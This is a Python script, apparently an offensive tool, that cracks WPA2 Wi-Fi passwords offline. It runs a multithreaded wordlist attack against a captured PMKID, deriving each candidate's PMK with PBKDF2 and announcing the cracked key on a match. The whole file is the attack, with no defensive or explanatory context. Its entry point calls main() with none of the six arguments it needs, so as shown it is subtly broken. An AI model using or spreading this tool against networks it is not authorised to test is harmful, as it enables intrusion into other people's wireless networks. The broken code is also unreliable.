import hmac
from hashlib import pbkdf2_hmac, sha1
import threading
import concurrent.futures
import time


def calculate_pmkid(pmk, ap_mac, sta_mac):
    pmkid = hmac.new(pmk, b"PMK Name" + ap_mac + sta_mac, sha1).digest()[:16]
    return pmkid


def find_pw_chunk(pw_list, ssid, ap_mac, sta_mac, captured_pmkid, stop_event):
    for pw in pw_list:
        if stop_event.is_set():
            break
        password = pw.strip()
        pmk = pbkdf2_hmac("sha1", password.encode("utf-8"), ssid, 4096, 32)
        pmkid = calculate_pmkid(pmk, ap_mac, sta_mac)
        if pmkid == captured_pmkid:
            print(f"\n[+] CRACKED WPA2 KEY: {password}")
            stop_event.set()


def main(ssid, bssid, client, pmkid, wordlist, workers):
    essid = ssid.encode()

    print(f"[*] Initializing PMKID Cracker")
    print(f"[*] SSID: {essid}")
    print(f"[*] BSSID: {bssid}")
    print(f"[*] Client Mac: {client}")
    print(f"[*] PMKID: {pmkid}")
    print(f"[*] Using Wordlist: {wordlist}")
    print(f"[*] Using Threads: {workers}")

    bssid = bytes.fromhex(bssid.replace(":", ""))
    client = bytes.fromhex(client.replace(":", ""))
    pmkid = bytes.fromhex(pmkid)

    stop_event = threading.Event()

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor, open(wordlist, "r",
                                                                                      encoding='ISO-8859-1') as file:
        start = time.perf_counter()
        chunk_size = 100000
        futures = []

        while True:
            pw_list = file.readlines(chunk_size)
            if not pw_list:
                break

            if stop_event.is_set():
                break

            future = executor.submit(find_pw_chunk, pw_list, essid, bssid, client, pmkid, stop_event)
            futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            pass

    finish = time.perf_counter()
    print(f'[+] Finished in {round(finish - start, 2)} second(s)')


if __name__ == '__main__':
    main()
